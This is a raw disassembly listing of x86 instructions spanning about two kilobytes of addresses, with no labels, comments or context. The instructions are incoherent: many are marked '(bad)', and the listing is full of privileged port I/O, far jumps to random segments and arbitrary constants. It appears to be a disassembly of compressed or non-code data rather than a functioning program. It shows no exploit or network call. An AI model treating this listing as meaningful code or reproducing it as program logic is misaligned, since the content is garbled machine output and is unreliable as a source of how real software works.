  6a0c26:	xchg   BYTE PTR [ebp-0x62],bh
  6a0c29:	not    DWORD PTR ds:0xfde27e64
  6a0c2f:	retf   
  6a0c30:	in     al,dx
  6a0c31:	mov    DWORD PTR [ebx],eax
  6a0c33:	mov    eax,fs
  6a0c35:	pop    ebx
  6a0c36:	std    
  6a0c37:	or     bl,bh
  6a0c39:	std    
  6a0c3a:	add    bh,BYTE PTR [esp+edx*8]
  6a0c3d:	inc    ebx
  6a0c3e:	rol    BYTE PTR [eax+0x7c38394],1
  6a0c44:	test   al,0xd3
  6a0c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a0c47:	rcl    BYTE PTR [ecx+0x55],1
  6a0c4a:	push   cs
  6a0c4b:	adc    al,0xa8
  6a0c4d:	fimul  DWORD PTR [esi]
  6a0c4f:	adc    BYTE PTR ds:0xb35b12f6,0x2c
  6a0c56:	dec    esi
  6a0c57:	xor    BYTE PTR [ebx+0x3],al
  6a0c5a:	jmp    0xa3d2:0x70567502
  6a0c61:	out    0x5,al
  6a0c63:	ja     0x6a0c51
  6a0c65:	mov    ch,0x91
  6a0c67:	mov    dh,0xe9
  6a0c69:	push   edi
  6a0c6a:	mov    ah,BYTE PTR [edx-0x7c614be0]
  6a0c70:	adc    ah,BYTE PTR [edx-0x3c26df6a]
  6a0c76:	ins    BYTE PTR es:[edi],dx
  6a0c77:	mov    ch,0xa0
  6a0c79:	(bad)  
  6a0c7a:	ret    
  6a0c7b:	lods   eax,DWORD PTR ds:[esi]
  6a0c7c:	ins    DWORD PTR es:[edi],dx
  6a0c7d:	push   ds
  6a0c7e:	adc    eax,DWORD PTR [edi-0x42]
  6a0c81:	out    dx,al
  6a0c82:	scas   al,BYTE PTR es:[edi]
  6a0c83:	je     0x6a0caa
  6a0c85:	add    al,0xa3
  6a0c87:	imul   edx,DWORD PTR [esi-0x41da6fef],0xffffff99
  6a0c8e:	shl    DWORD PTR [eax-0x13],cl
  6a0c91:	outs   dx,DWORD PTR ds:[esi]
  6a0c92:	rcl    DWORD PTR [edi-0x2],0x55
  6a0c96:	push   es
  6a0c97:	jo     0x6a0c23
  6a0c99:	inc    esi
  6a0c9a:	pop    edx
  6a0c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a0c9c:	(bad)  
  6a0c9d:	adc    eax,0xf4c8c56c
  6a0ca2:	jne    0x6a0cc2
  6a0ca4:	sub    BYTE PTR [edx-0x32a93b9d],dl
  6a0caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a0cab:	dec    esi
  6a0cac:	push   ds
  6a0cad:	jmp    0xe81ab65a
  6a0cb2:	and    bh,BYTE PTR [ecx+0x14659c52]
  6a0cb8:	aam    0x1e
  6a0cba:	dec    ebx
  6a0cbb:	jecxz  0x6a0cb8
  6a0cbd:	push   edi
  6a0cbe:	cmp    bl,BYTE PTR [esi+0x107773e7]
  6a0cc4:	cmp    eax,0x1773ec7a
  6a0cc9:	adc    esi,DWORD PTR [eax-0x27]
  6a0ccc:	gs (bad) 
  6a0ccf:	ficomp DWORD PTR [esi+0x6a803657]
  6a0cd5:	aad    0x67
  6a0cd7:	js     0x6a0d19
  6a0cd9:	mov    al,ds:0x2286d797
  6a0cde:	xchg   edx,eax
  6a0cdf:	sub    edi,DWORD PTR [ebx+ebp*2]
  6a0ce2:	or     eax,0x19c9b204
  6a0ce7:	fsub   QWORD PTR [esi-0x3b]
  6a0cea:	lock pop ss
  6a0cec:	mov    ch,0x92
  6a0cee:	gs jge 0x6a0cd1
  6a0cf1:	cmp    DWORD PTR [edi+eax*2+0x5af302aa],edx
  6a0cf8:	sub    bh,BYTE PTR [ecx+0x1a]
  6a0cfb:	mov    dl,0x5f
  6a0cfd:	sub    DWORD PTR [edi],ecx
  6a0cff:	adc    DWORD PTR [edx-0x4da58c73],eax
  6a0d05:	xchg   esi,eax
  6a0d06:	clc    
  6a0d07:	ja     0x6a0d73
  6a0d09:	mov    esi,0x35cf2c33
  6a0d0e:	push   cs
  6a0d0f:	or     al,0x51
  6a0d11:	popfw  
  6a0d13:	jae    0x6a0d52
  6a0d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a0d16:	mov    ecx,0xcf025d5b
  6a0d1b:	or     ch,dh
  6a0d1d:	dec    ebp
  6a0d1e:	fistp  QWORD PTR [eax]
  6a0d20:	inc    ecx
  6a0d21:	int3   
  6a0d22:	fidivr WORD PTR ds:0x48d5e154
  6a0d28:	cdq    
  6a0d29:	xor    eax,0x96875c30
  6a0d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a0d2f:	xor    dh,dl
  6a0d31:	(bad)  
  6a0d33:	lock hlt 
  6a0d35:	imul   eax,eax,0x64
  6a0d38:	lock and ah,dl
  6a0d3b:	fst    st(1)
  6a0d3d:	pop    ds
  6a0d3e:	dec    ecx
  6a0d3f:	clc    
  6a0d40:	mov    bh,dl
  6a0d42:	loope  0x6a0cdb
  6a0d44:	enter  0x183d,0xa1
  6a0d48:	shld   ebx,ecx,cl
  6a0d4b:	(bad)  
  6a0d4d:	xchg   ebp,eax
  6a0d4e:	mov    BYTE PTR [eax],cl
  6a0d50:	in     al,dx
  6a0d51:	pushf  
  6a0d52:	cdq    
  6a0d53:	sub    dl,BYTE PTR [edi+0x12]
  6a0d56:	jbe    0x6a0dcb
  6a0d58:	push   es
  6a0d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a0d5a:	adc    eax,0xbde054a8
  6a0d5f:	lods   eax,DWORD PTR ds:[esi]
  6a0d60:	les    ecx,FWORD PTR [ebx+0x38]
  6a0d63:	or     DWORD PTR [esi],0x7e
  6a0d66:	lahf   
  6a0d67:	stc    
  6a0d68:	outs   dx,BYTE PTR ds:[esi]
  6a0d69:	loope  0x6a0ddf
  6a0d6b:	aad    0x40
  6a0d6d:	(bad)  
  6a0d6e:	int    0x1e
  6a0d70:	daa    
  6a0d71:	ds sbb esp,edx
  6a0d74:	sbb    BYTE PTR [edx+esi*2+0x747af0a7],ch
  6a0d7b:	ins    DWORD PTR es:[edi],dx
  6a0d7c:	jbe    0x6a0d59
  6a0d7e:	and    esi,0xffffffec
  6a0d81:	call   0xfb55b3fe
  6a0d86:	adc    DWORD PTR [ebp+0xe998a51],edx
  6a0d8c:	mov    edi,0x8f9e9c0
  6a0d91:	and    al,0xba
  6a0d93:	rcr    al,cl
  6a0d95:	sbb    eax,0x94d9ebfb
  6a0d9a:	inc    edi
  6a0d9b:	test   BYTE PTR gs:[eax+esi*1-0x5a],0xb3
  6a0da1:	cmp    al,0xcc
  6a0da3:	jne    0x6a0e07
  6a0da5:	add    dh,cl
  6a0da7:	jp     0x6a0d3b
  6a0da9:	outs   dx,DWORD PTR ds:[esi]
  6a0daa:	out    dx,al
  6a0dab:	gs jmp 0x6eed8224
  6a0db1:	int    0x2b
  6a0db3:	mov    ch,0x2
  6a0db5:	outs   dx,BYTE PTR ds:[esi]
  6a0db6:	cmp    edx,DWORD PTR es:[edx-0x24]
  6a0dba:	pop    eax
  6a0dbb:	lods   al,BYTE PTR ds:[esi]
  6a0dbc:	repz scas al,BYTE PTR es:[edi]
  6a0dbe:	add    DWORD PTR [edx+edi*2],0xaf7fd035
  6a0dc5:	jno    0x6a0dea
  6a0dc7:	cld    
  6a0dc8:	and    ebx,DWORD PTR ds:0x39aab02a
  6a0dce:	stc    
  6a0dcf:	mov    ds:0x4c32f9e0,eax
  6a0dd4:	in     al,dx
  6a0dd5:	xchg   esi,eax
  6a0dd6:	mov    dl,BYTE PTR [ebx]
  6a0dd8:	jb     0x6a0ddb
  6a0dda:	cmc    
  6a0ddb:	and    DWORD PTR [esp+eiz*8+0x693791fb],edx
  6a0de2:	shr    BYTE PTR [ebx+0x556c7356],0x5c
  6a0de9:	mov    al,ds:0xb11fe86e
  6a0dee:	fidivr DWORD PTR [ecx+0x2686552a]
  6a0df4:	cmp    al,0x77
  6a0df6:	fidivr DWORD PTR [esi-0x6c90eb33]
  6a0dfc:	jp     0x6a0e19
  6a0dfe:	mov    cl,0xc5
  6a0e00:	cmp    esi,DWORD PTR [eax+0x1ac5d37]
  6a0e06:	xchg   ebp,eax
  6a0e07:	jmp    0x92b27dae
  6a0e0c:	pop    ds
  6a0e0d:	mov    al,ds:0x89988d56
  6a0e12:	aad    0xa8
  6a0e14:	jb     0x6a0e89
  6a0e16:	adc    eax,0xc4137576
  6a0e1b:	test   eax,0x926678bc
  6a0e20:	cmp    DWORD PTR [eax],ecx
  6a0e22:	cdq    
  6a0e23:	xchg   esi,eax
  6a0e24:	pop    ds
  6a0e25:	or     ebx,DWORD PTR [edx-0x30]
  6a0e28:	scas   eax,DWORD PTR es:[edi]
  6a0e29:	pop    ebp
  6a0e2a:	dec    ecx
  6a0e2b:	test   eax,0xea26f698
  6a0e30:	and    eax,0x9e25ce1a
  6a0e35:	push   edi
  6a0e36:	sub    DWORD PTR [ecx-0x29708e1],eax
  6a0e3c:	mov    cl,0x91
  6a0e3e:	mov    ebp,0x816c6053
  6a0e43:	out    0x2b,eax
  6a0e45:	sti    
  6a0e46:	std    
  6a0e47:	mov    ds:0xda291876,eax
  6a0e4c:	xor    bh,BYTE PTR ds:0xb4d21a21
  6a0e52:	or     al,0x16
  6a0e54:	and    al,0x4f
  6a0e56:	test   BYTE PTR [ebx+0x6],dl
  6a0e59:	push   es
  6a0e5a:	jb     0x6a0e39
  6a0e5c:	rcr    DWORD PTR [esp+edi*4-0x600638eb],1
  6a0e63:	stc    
  6a0e64:	leave  
  6a0e65:	or     DWORD PTR [esi],0xffffff95
  6a0e68:	adc    edx,esp
  6a0e6a:	fwait
  6a0e6b:	pop    ds
  6a0e6c:	stc    
  6a0e6d:	and    al,BYTE PTR [ebp-0x32]
  6a0e70:	sub    eax,0x2e1d428f
  6a0e75:	lods   eax,DWORD PTR ds:[esi]
  6a0e76:	xchg   edi,eax
  6a0e77:	mov    al,0x76
  6a0e79:	cmp    dl,BYTE PTR [edi-0x2e]
  6a0e7c:	jmp    0x6a0e43
  6a0e7e:	cmp    edi,ecx
  6a0e80:	dec    esi
  6a0e81:	addr16 mov bl,0x1e
  6a0e84:	push   esi
  6a0e85:	test   al,0x29
  6a0e87:	mov    eax,ebp
  6a0e89:	lods   al,BYTE PTR ds:[esi]
  6a0e8a:	out    0x68,eax
  6a0e8c:	inc    ebx
  6a0e8d:	dec    edi
  6a0e8e:	nop
  6a0e8f:	cli    
  6a0e90:	push   ebp
  6a0e91:	mov    al,ds:0x9cd4a108
  6a0e96:	jno    0x6a0e96
  6a0e98:	mov    bl,0xdd
  6a0e9a:	pushf  
  6a0e9b:	xchg   edx,eax
  6a0e9c:	repnz dec edi
  6a0e9e:	inc    ecx
  6a0e9f:	out    0x8d,eax
  6a0ea1:	inc    eax
  6a0ea2:	sbb    ah,0xb7
  6a0ea5:	ret    0xf688
  6a0ea8:	scas   eax,DWORD PTR es:[edi]
  6a0ea9:	cmp    al,0xce
  6a0eab:	adc    BYTE PTR [edx-0x6be928ed],0x7f
  6a0eb2:	test   esp,0xfc05e424
  6a0eb8:	pop    ss
  6a0eb9:	call   0xa4be:0x6c243063
  6a0ec0:	mov    cl,0x8a
  6a0ec2:	shl    BYTE PTR [ebp-0x5b6bd6aa],cl
  6a0ec8:	pop    es
  6a0ec9:	fs pop edi
  6a0ecb:	and    eax,0x1738dfa8
  6a0ed0:	aad    0x17
  6a0ed2:	or     al,0x8c
  6a0ed4:	test   BYTE PTR [ebx],al
  6a0ed6:	popf   
  6a0ed7:	pop    ds
  6a0ed8:	xchg   edx,eax
  6a0ed9:	ins    DWORD PTR es:[edi],dx
  6a0eda:	dec    ecx
  6a0edb:	push   ebx
  6a0edc:	xor    esi,eax
  6a0ede:	out    dx,eax
  6a0edf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a0ee0:	repnz mov eax,0x41ba52e0
  6a0ee6:	mov    eax,ds:0x86ef63b
  6a0eeb:	jmp    0x6a0f3d
  6a0eed:	imul   esp,DWORD PTR [esi-0x25bb9445],0x6585bdf1
  6a0ef7:	cmp    eax,0x8b26bac4
  6a0efc:	sub    DWORD PTR [esi],edi
  6a0efe:	retf   0x4cd5
  6a0f01:	mov    al,ds:0xcee91112
  6a0f06:	or     al,0xaf
  6a0f08:	imul   ebp,DWORD PTR [edx],0xffffffc5
  6a0f0b:	jns    0x6a0f19
  6a0f0d:	xchg   esi,eax
  6a0f0e:	xor    bl,BYTE PTR [esi-0x117d6b7e]
  6a0f14:	leave  
  6a0f15:	call   0x9be06a
  6a0f1a:	ret    0x23bb
  6a0f1d:	mov    eax,0x429116b6
  6a0f22:	push   0x22d31106
  6a0f27:	or     BYTE PTR [ecx+0x16],bl
  6a0f2a:	or     al,0xdc
  6a0f2c:	out    dx,eax
  6a0f2d:	inc    ebx
  6a0f2e:	popa   
  6a0f2f:	mov    esi,0x3cbf5c8a
  6a0f34:	cmp    BYTE PTR [esi-0x79f289b9],0xcf
  6a0f3b:	pop    edx
  6a0f3c:	xchg   esi,eax
  6a0f3d:	test   eax,0x4bd2785a
  6a0f42:	mov    al,0x7d
  6a0f44:	inc    edi
  6a0f45:	stos   BYTE PTR es:[edi],al
  6a0f46:	lods   al,BYTE PTR ds:[esi]
  6a0f47:	cmp    eax,eax
  6a0f49:	ins    DWORD PTR es:[edi],dx
  6a0f4a:	addr16 mov al,ds:0x4aef
  6a0f4e:	aam    0x65
  6a0f50:	and    BYTE PTR [ebx+0x47],0xda
  6a0f54:	cwde   
  6a0f55:	cmp    edx,DWORD PTR [ebx-0x1]
  6a0f58:	dec    esp
  6a0f59:	dec    ebp
  6a0f5a:	in     eax,dx
  6a0f5b:	mov    ecx,0x31f3fff6
  6a0f60:	pop    ecx
  6a0f61:	add    DWORD PTR [ecx-0x4e09b069],esi
  6a0f67:	sub    BYTE PTR [edx-0x2d],bl
  6a0f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a0f6b:	icebp  
  6a0f6c:	js     0x6a0fc0
  6a0f6e:	sub    DWORD PTR [edi-0x4a0f5daa],edx
  6a0f74:	rcr    DWORD PTR [edi],cl
  6a0f76:	je     0x6a0f51
  6a0f78:	mov    eax,ds:0xb84608dc
  6a0f7d:	push   ds
  6a0f7e:	cmp    DWORD PTR [esp+ebp*4-0x23877dac],0xcf73d1eb
  6a0f89:	cmp    ebx,DWORD PTR [esi-0x6ea03d50]
  6a0f8f:	mov    al,ds:0x8716dd4a
  6a0f94:	xchg   esi,eax
  6a0f95:	jl     0x6a0f76
  6a0f97:	push   edx
  6a0f98:	or     dh,BYTE PTR [ebp+0x38]
  6a0f9b:	data16 sti 
  6a0f9d:	pop    es
  6a0f9e:	mov    edi,0xbe02b8ea
  6a0fa3:	(bad)  
  6a0fa4:	gs aaa 
  6a0fa6:	jno    0x6a0f35
  6a0fa8:	adc    dh,BYTE PTR [eax+0x5e]
  6a0fab:	jge    0x6a0ff0
  6a0fad:	mov    ecx,0x9d70ca7
  6a0fb2:	(bad)  
  6a0fb3:	fwait
  6a0fb4:	jno    0x6a0f92
  6a0fb6:	div    BYTE PTR [ebp-0x5c]
  6a0fb9:	mov    al,0xb0
  6a0fbb:	icebp  
  6a0fbc:	xchg   ebx,eax
  6a0fbd:	sbb    al,0xa5
  6a0fbf:	mov    dl,BYTE PTR [edi-0x16]
  6a0fc2:	retf   
  6a0fc3:	dec    esi
  6a0fc4:	push   cs
  6a0fc5:	jl     0x6a1035
  6a0fc7:	ds push 0x7f
  6a0fca:	fld    DWORD PTR [ecx]
  6a0fcc:	pusha  
  6a0fcd:	test   eax,esi
  6a0fcf:	cld    
  6a0fd0:	xlat   BYTE PTR ds:[ebx]
  6a0fd1:	daa    
  6a0fd2:	sub    eax,0x7b868819
  6a0fd7:	dec    esi
  6a0fd8:	loopne 0x6a1057
  6a0fda:	nop
  6a0fdb:	and    eax,0xa97a03ba
  6a0fe0:	sub    ah,ah
  6a0fe2:	push   esp
  6a0fe3:	xor    ah,BYTE PTR [ebp+0x2d]
  6a0fe6:	xor    eax,0x999f999c
  6a0feb:	and    eax,0xc033c3be
  6a0ff0:	pop    edx
  6a0ff1:	sub    DWORD PTR [ebx+0x79],0xcce7878b
  6a0ff8:	xchg   edx,eax
  6a0ff9:	mov    edi,ebx
  6a0ffb:	mov    edx,0x9591347f
  6a1000:	mov    esp,ebp
  6a1002:	add    eax,esp
  6a1004:	mov    esi,0x5ea22518
  6a1009:	push   0x85fe4159
  6a100e:	loope  0x6a1017
  6a1010:	mov    ecx,0xc1b5599
  6a1015:	out    dx,al
  6a1016:	fdiv   QWORD PTR [ebx]
  6a1018:	adc    al,0x31
  6a101a:	dec    ecx
  6a101b:	das    
  6a101c:	ja     0x6a1020
  6a101e:	mov    ebp,esi
  6a1020:	push   0xffffff9b
  6a1022:	out    0xc9,al
  6a1024:	test   DWORD PTR [esi],eax
  6a1026:	mov    ebx,0x2e8146cc
  6a102b:	push   edx
  6a102c:	mov    al,0x31
  6a102e:	call   0x30b64da8
  6a1033:	sbb    DWORD PTR [ebp-0x430a8dd0],edi
  6a1039:	sub    al,0x6
  6a103b:	unpcklps xmm1,XMMWORD PTR [ebx+edi*1+0x65013306]
  6a1043:	adc    esi,DWORD PTR [esp+edi*2]
  6a1046:	mov    esp,0x340f5bcc
  6a104b:	pop    edi
  6a104c:	jmp    0x6a104e
  6a104e:	xchg   DWORD PTR [esi-0x107b2ce3],esi
  6a1054:	lock or DWORD PTR [edi-0x4d29443b],esi
  6a105b:	mov    eax,0x43ebb1a5
  6a1060:	repz sar BYTE PTR [edi],0xef
  6a1064:	xchg   DWORD PTR [ebx],edi
  6a1066:	cmp    al,0xf8
  6a1068:	fidiv  WORD PTR [ebp+ebx*1-0x5a]
  6a106c:	pusha  
  6a106d:	mov    eax,0xe770b82
  6a1072:	aas    
  6a1073:	mov    bh,0x7d
  6a1075:	aad    0x1b
  6a1077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a1078:	add    eax,0x6301d623
  6a107d:	pushf  
  6a107e:	push   eax
  6a107f:	adc    al,0xfe
  6a1081:	es jecxz 0x6a1012
  6a1084:	(bad)  
  6a1085:	iret   
  6a1086:	add    BYTE PTR [ebp-0x318ed305],dl
  6a108c:	xchg   edx,eax
  6a108d:	adc    DWORD PTR [eax+0x3edac106],0xbf811795
  6a1097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a1098:	xchg   edi,eax
  6a1099:	or     al,0xf1
  6a109b:	pop    esi
  6a109c:	or     BYTE PTR [ebx-0x66],bl
  6a109f:	ret    
  6a10a0:	jecxz  0x6a10e3
  6a10a2:	xor    al,0x7
  6a10a4:	push   es
  6a10a5:	xor    eax,DWORD PTR [edi-0x50]
  6a10a8:	or     BYTE PTR [ebx-0x659badb4],cl
  6a10ae:	xchg   esi,eax
  6a10af:	mov    eax,ds:0xb3025695
  6a10b4:	push   edi
  6a10b5:	int3   
  6a10b6:	pop    eax
  6a10b7:	out    dx,eax
  6a10b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a10b9:	sub    al,0xf0
  6a10bb:	adc    bh,BYTE PTR [edi+0x5cfad1f5]
  6a10c1:	pop    ds
  6a10c2:	mov    cl,BYTE PTR [edx+0x37a77924]
  6a10c8:	adc    eax,0xb48441e6
  6a10cd:	jle    0x6a1078
  6a10cf:	in     al,0x45
  6a10d1:	out    dx,al
  6a10d2:	xchg   edx,eax
  6a10d3:	cld    
  6a10d4:	jp     0x6a1090
  6a10d6:	(bad)  
  6a10d7:	pop    ss
  6a10d8:	cmp    ah,BYTE PTR [ecx+ebp*1+0x45214bb2]
  6a10df:	mov    eax,DWORD PTR [ebx+0x3ce9dc7b]
  6a10e5:	xor    al,0xd9
  6a10e7:	fmulp  st(4),st
  6a10e9:	imul   esp,DWORD PTR [ecx+0x6fb29690],0xffffffae
  6a10f0:	fsub   QWORD PTR [edx-0x1b]
  6a10f3:	dec    edx
  6a10f4:	mov    ebp,DWORD PTR ds:0x5c1cd568
  6a10fa:	or     DWORD PTR [eax-0x16afa734],eax
  6a1100:	or     DWORD PTR [edx-0x7d],edx
  6a1103:	sub    eax,0x2fdbe9d
  6a1108:	inc    ebp
  6a1109:	mov    BYTE PTR [edx+esi*4+0x63c7c858],0x92
  6a1111:	mov    DWORD PTR [ecx+0x10],edx
  6a1114:	dec    edi
  6a1115:	xor    BYTE PTR [eax-0x1b],ch
  6a1118:	add    al,0x63
  6a111a:	scas   al,BYTE PTR es:[edi]
  6a111b:	setp   BYTE PTR [ebp-0x2c]
  6a111f:	add    DWORD PTR [esi+0x32],edi
  6a1122:	inc    ebx
  6a1123:	cmp    BYTE PTR [esi-0x19],dl
  6a1126:	test   BYTE PTR [ebp+0x153d31ac],ah
  6a112c:	sub    al,BYTE PTR [ebp+0x3f]
  6a112f:	fs add eax,0x2e82ce5d
  6a1135:	cli    
  6a1136:	mov    eax,ds:0x8c0d15b5
  6a113b:	mov    al,ds:0xa0a2309c
  6a1140:	or     BYTE PTR [eax],dl
  6a1142:	jne    0x6a1188
  6a1144:	test   eax,0x17f82f09
  6a1149:	and    dh,BYTE PTR [ebx+0x3ae960b1]
  6a114f:	cmp    edx,ecx
  6a1151:	mov    edx,0xc58d0bac
  6a1156:	cmp    al,0xa2
  6a1158:	sub    DWORD PTR [edi+eax*1],esp
  6a115b:	test   BYTE PTR [ecx+0x36],dh
  6a115e:	pop    fs
  6a1160:	inc    eax
  6a1161:	mov    WORD PTR [ecx],gs
  6a1163:	and    ebp,DWORD PTR [edx-0x48]
  6a1166:	sbb    eax,0xdf05c7f3
  6a116b:	and    al,0xab
  6a116d:	lea    esi,[edx]
  6a116f:	scas   eax,DWORD PTR es:[edi]
  6a1170:	stos   DWORD PTR es:[edi],eax
  6a1171:	xchg   esp,eax
  6a1172:	xor    eax,0xc7c20533
  6a1177:	jbe    0x6a118a
  6a1179:	(bad)  
  6a117a:	and    BYTE PTR [esi-0x31],ch
  6a117d:	push   edx
  6a117e:	sbb    BYTE PTR [esi],dl
  6a1180:	mov    eax,ds:0x2f09b1f9
  6a1185:	cli    
  6a1186:	pop    esi
  6a1187:	and    BYTE PTR [edi],ah
  6a1189:	mov    edx,0x57244b02
  6a118e:	push   edi
  6a118f:	sbb    DWORD PTR ds:0x5b27f1d1,esp
  6a1195:	inc    ecx
  6a1196:	adc    ch,BYTE PTR [eax+edx*1+0xaaae7dd]
  6a119d:	iret   
  6a119e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a119f:	and    eax,0xb848a91e
  6a11a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a11a5:	mov    edi,0xc850441
  6a11aa:	sbb    ah,BYTE PTR [esi-0xde87ed6]
  6a11b0:	in     eax,dx
  6a11b1:	lods   al,BYTE PTR ds:[si]
  6a11b3:	rcr    BYTE PTR [eax],cl
  6a11b5:	je     0x6a11f5
  6a11b7:	and    esp,DWORD PTR [esi-0x3712920b]
  6a11bd:	mov    edx,0x18fd599e
  6a11c2:	push   es
  6a11c3:	jbe    0x6a1220
  6a11c5:	loop   0x6a11d7
  6a11c7:	leave  
  6a11c8:	adc    edi,DWORD PTR [eax+0x6ec2ff48]
  6a11ce:	cld    
  6a11cf:	lds    ecx,FWORD PTR [ecx]
  6a11d1:	std    
  6a11d2:	mov    ebx,0x48e4f169
  6a11d7:	adc    BYTE PTR [ecx],dh
  6a11d9:	xchg   ebx,eax
  6a11da:	add    esi,DWORD PTR [edi]
  6a11dc:	pop    eax
  6a11dd:	fs repnz and al,0x30
  6a11e1:	vpsubusw xmm7,xmm0,xmm3
  6a11e5:	xchg   esp,eax
  6a11e6:	pop    es
  6a11e7:	xor    BYTE PTR [edx],ch
  6a11e9:	stos   BYTE PTR es:[edi],al
  6a11ea:	inc    ebp
  6a11eb:	mov    eax,0xb61105da
  6a11f0:	sbb    eax,0xdf335c2b
  6a11f5:	add    eax,0x97a809c2
  6a11fa:	dec    edx
  6a11fb:	bts    DWORD PTR [ebx+edx*8-0x64],eax
  6a1200:	push   cs
  6a1201:	and    DWORD PTR [edx+eax*2-0xb],0x4e
  6a1206:	aas    
  6a1207:	xchg   edx,eax
  6a1208:	xchg   ecx,eax
  6a1209:	outs   dx,BYTE PTR ds:[esi]
  6a120a:	jmp    0xd8cba69f
  6a120f:	in     eax,dx
  6a1210:	out    dx,al
  6a1211:	test   al,0x3f
  6a1213:	mov    esp,0x6308b85
  6a1218:	popf   
  6a1219:	adc    eax,0x41aea34b
  6a121e:	jnp    0x6a11f5
  6a1220:	icebp  
  6a1221:	push   ebp
  6a1222:	pop    esi
  6a1223:	jns    0x6a124f
  6a1225:	or     dl,BYTE PTR [edi]
  6a1227:	cli    
  6a1228:	enter  0x38,0x7d
  6a122c:	call   0x9c7f:0x3370735c
  6a1233:	fldcw  WORD PTR [edx]
  6a1235:	jne    0x6a12b1
  6a1237:	sbb    edx,edi
  6a1239:	sub    eax,0x4a2acf63
  6a123e:	inc    edx
  6a123f:	dec    esp
  6a1240:	push   es
  6a1241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a1242:	xchg   edx,eax
  6a1243:	imul   DWORD PTR [eax]
  6a1245:	ror    ebp,0xab
  6a1248:	iret   
  6a1249:	fwait
  6a124a:	sub    bl,BYTE PTR [esi+0x19435f22]
  6a1250:	mov    ebx,0x88d08c8c
  6a1255:	pop    eax
  6a1256:	jo     0x6a1245
  6a1258:	call   0xbe94:0x2d0e7b08
  6a125f:	les    ebx,FWORD PTR [esi+0x73]
  6a1262:	gs loopne 0x6a1205
  6a1265:	pop    esp
  6a1266:	xlat   BYTE PTR ds:[ebx]
  6a1267:	push   edi
  6a1268:	xchg   edi,eax
  6a1269:	imul   esp,eax,0xffffff97
  6a126c:	rcl    BYTE PTR [ebx],cl
  6a126e:	mov    dl,0x41
  6a1270:	mov    ds,WORD PTR [edx+0x1bf511a5]
  6a1276:	lods   eax,DWORD PTR ds:[esi]
  6a1277:	(bad)  
  6a1278:	mov    edi,cr7
  6a127b:	sub    DWORD PTR [esi],edx
  6a127d:	sahf   
  6a127e:	mov    ecx,0x58d42d4
  6a1283:	jl     0x6a1289
  6a1285:	inc    ebp
  6a1286:	retf   0x7f74
  6a1289:	int3   
  6a128a:	pop    es
  6a128b:	sbb    eax,0xad761ffd
  6a1290:	pop    edx
  6a1291:	cmc    
  6a1292:	and    DWORD PTR [ecx-0x4],0xeee4e491
  6a1299:	fisub  DWORD PTR [ecx-0xd]
  6a129c:	xchg   esi,eax
  6a129d:	outs   dx,DWORD PTR ds:[esi]
  6a129e:	popf   
  6a129f:	push   ss
  6a12a0:	(bad)  
  6a12a2:	fwait
  6a12a3:	mov    dl,0xc4
  6a12a5:	add    eax,0x977f43c8
  6a12aa:	shl    BYTE PTR [eax+ecx*8],cl
  6a12ad:	ret    0x5b2
  6a12b0:	pop    edx
  6a12b1:	nop
  6a12b2:	lahf   
  6a12b3:	xor    edx,DWORD PTR [edx-0x2a]
  6a12b6:	mov    ds:0x34c13267,eax
  6a12bb:	jbe    0x6a12e6
  6a12bd:	fdivr  QWORD PTR [ebx-0x59]
  6a12c0:	jl     0x6a1323
  6a12c2:	pusha  
  6a12c3:	sbb    bl,BYTE PTR [ecx+ecx*2+0x5a]
  6a12c7:	iret   
  6a12c8:	cld    
  6a12c9:	pop    edi
  6a12ca:	pushf  
  6a12cb:	(bad)
  6a12cf:	mov    ebp,0xe9ab67d7
  6a12d4:	push   ecx
  6a12d5:	data16 lods al,BYTE PTR ds:[esi]
  6a12d7:	shl    BYTE PTR [edi+0xe],cl
  6a12da:	or     eax,0x579568bc
  6a12df:	and    DWORD PTR [esi+0x142f5d14],eax
  6a12e5:	pop    ebp
  6a12e6:	push   edx
  6a12e7:	xchg   ebp,eax
  6a12e8:	push   esp
  6a12e9:	inc    edi
  6a12ea:	icebp  
  6a12eb:	xchg   BYTE PTR [edx],ch
  6a12ed:	les    edx,FWORD PTR [ecx]
  6a12ef:	sub    edi,DWORD PTR [eax-0x6c20d437]
  6a12f5:	ds pop esi
  6a12f7:	call   0x97278aa5
  6a12fc:	xor    bh,dl
  6a12fe:	mov    edx,0xd5606fb2
  6a1303:	ret    
  6a1304:	mov    eax,0x79f6e2b1
  6a1309:	jl     0x6a12d6
  6a130b:	fwait
  6a130c:	inc    ecx
  6a130d:	clc    
  6a130e:	aaa    
  6a130f:	ret    
  6a1310:	xor    DWORD PTR [eax],ebx
  6a1312:	inc    ecx
  6a1313:	jle    0x6a135c
  6a1315:	jg     0x6a1383
  6a1317:	loope  0x6a137e
  6a1319:	xchg   edx,eax
  6a131a:	lods   eax,DWORD PTR ds:[esi]
  6a131b:	or     DWORD PTR [ecx-0x1f611319],0xb8ba571
  6a1325:	out    0x72,al
  6a1327:	push   0x69
  6a1329:	ss popf 
  6a132b:	jg     0x6a12e0
  6a132d:	rcr    cl,1
  6a132f:	jmp    0x6a12d3
  6a1331:	in     eax,dx
  6a1332:	xchg   DWORD PTR [ebx],edx
  6a1334:	jecxz  0x6a12b9
  6a1336:	push   es
  6a1337:	sub    DWORD PTR [eax+0xb],0xe2a9192d
  6a133e:	jmp    0x6a12ca
  6a1340:	(bad)  
  6a1341:	ja     0x6a12e0
  6a1343:	fnsave [esi-0x503da2fb]
  6a1349:	cs push ecx
  6a134b:	inc    eax
  6a134c:	cs fs stos DWORD PTR es:[edi],eax
  6a134f:	inc    ebx
  6a1350:	jb     0x6a12fb
  6a1352:	sub    dl,0xda
  6a1355:	sbb    BYTE PTR [esp+eiz*2-0x2f],ch
  6a1359:	cmp    eax,0x89c57137
  6a135e:	fwait
